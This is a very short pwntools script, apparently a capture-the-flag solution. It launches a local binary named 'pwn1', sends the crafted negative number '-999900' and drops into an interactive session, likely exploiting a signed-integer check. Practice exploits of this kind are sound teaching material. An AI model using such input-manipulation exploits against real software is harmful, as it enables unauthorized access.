from pwn import *

p = process('./pwn1')

p.sendline(b'-999900')

p.interactive()
